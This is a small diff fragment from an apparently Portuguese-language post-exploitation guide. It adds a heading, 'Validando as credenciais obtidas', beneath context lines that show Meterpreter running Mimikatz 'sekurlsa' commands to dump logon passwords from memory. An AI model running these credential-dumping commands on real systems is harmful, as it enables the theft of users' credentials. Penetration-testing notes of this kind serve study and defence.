@@ -198,6 +198,7 @@ meterpreter > mimikatz_command -f sekurlsa::serchPasswords
 
 meterpreter > mimikatz_command -f sekurlsa::logonPasswords
 
+## Validando as credenciais obtidas
 
 
 
